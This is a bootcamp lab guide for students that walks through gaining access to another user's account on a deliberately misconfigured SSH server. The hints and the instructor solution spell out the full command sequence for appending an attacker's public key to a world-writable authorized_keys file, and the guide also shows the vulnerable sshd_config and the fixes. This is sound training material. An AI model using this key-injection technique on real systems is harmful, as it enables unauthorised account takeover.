# SSH Key Authentication Lab - Student Guide

> **Lab Type:** Pre-Lab (Complete this FIRST!)
> **Port:** 2222
> **Difficulty:** Beginner

---

## Scenario

You've discovered a development server for LeaguesOfCode. The server has SSH enabled on port 2222. Your goal is to gain access to another user's account and retrieve their private notes.

---

## Initial Access

Connect to the SSH lab:
```bash
ssh noob@10.10.61.221 -p 2222
```

**Credentials:**
- Username: `noob`
- Password: `noob`

---

## Your Mission

1. **Explore the system** - Look around, check other users' home directories
2. **Find a vulnerability** - Something is misconfigured...
3. **Gain access to john's account** - Without knowing his password!
4. **Read john's private notes** - Contains valuable information for other labs

---

## Hints (Try without these first!)

<details>
<summary>Hint 1: What to look for</summary>

Check the permissions on `/home/john/` and its subdirectories.
```bash
ls -la /home/john/
```
</details>

<details>
<summary>Hint 2: The vulnerability</summary>

The `.ssh` directory has incorrect permissions. What can you do with write access to someone's `.ssh` folder?
</details>

<details>
<summary>Hint 3: SSH key authentication</summary>

SSH allows authentication via public/private key pairs. The public key goes in `~/.ssh/authorized_keys`.

Generate a key pair:
```bash
ssh-keygen -t rsa -f /tmp/mykey
```
</details>

<details>
<summary>Hint 4: The attack</summary>

1. Generate SSH keys as noob
2. Write your public key to john's authorized_keys
3. SSH as john using your private key
</details>

---

## Solution (Instructor Only)

<details>
<summary>Full Solution - DO NOT OPEN</summary>

```bash
# 1. SSH as noob
ssh noob@10.10.61.221 -p 2222
# Password: noob

# 2. Check john's .ssh permissions
ls -la /home/john/
# Notice: .ssh has 777 permissions (world-writable!)

# 3. Generate SSH key pair
ssh-keygen -t rsa -f /tmp/mykey -N ""

# 4. Write public key to john's authorized_keys
cat /tmp/mykey.pub >> /home/john/.ssh/authorized_keys

# 5. Exit and reconnect as john
exit
ssh -i /tmp/mykey john@10.10.61.221 -p 2222

# 6. Read the hint file
cat /home/john/hint.txt
```

**Why this works:**
- John's `.ssh` directory has `777` permissions (should be `700`)
- `StrictModes` is disabled in sshd_config (normally SSH refuses keys in writable directories)
- Password authentication is disabled for john, but key authentication works

</details>

---

## What You'll Learn

- Linux file permissions and their security implications
- SSH key-based authentication
- How `StrictModes` protects SSH
- Why `.ssh` directories should have restrictive permissions (700)

---

## Reward

John's `hint.txt` contains:
- Database credentials
- SQL injection payloads
- JWT secrets and bypass techniques
- File upload tricks
- CSRF attack templates
- SSRF internal endpoints
- XSS payloads

**This information will help you complete ALL other labs!**

---

## Next Steps

After completing this lab, proceed to the web labs:

| Lab | Path | What You'll Learn |
|-----|------|-------------------|
| SQL Injection | /resources/ | Database extraction techniques |
| JWT Auth | /account/ | Token manipulation attacks |
| File Upload | /profile/ | Bypassing upload filters |
| CSRF | /share/ | Cross-site request forgery |
| SSRF | /api/ | Server-side request forgery |
| XSS | /search/ | Cross-site scripting |

---

## Technical Details

**Server Configuration (Vulnerable):**
```
# /etc/ssh/sshd_config
StrictModes no              # <-- Should be "yes"
PasswordAuthentication yes

# Match block for john
Match User john
    PasswordAuthentication no
```

**John's home directory (Vulnerable):**
```
/home/john/
├── .ssh/                   # 777 permissions (should be 700!)
│   └── authorized_keys     # 644 permissions
└── hint.txt                # Developer notes
```

---

*LeaguesOfCode Cybersecurity Bootcamp 2026*
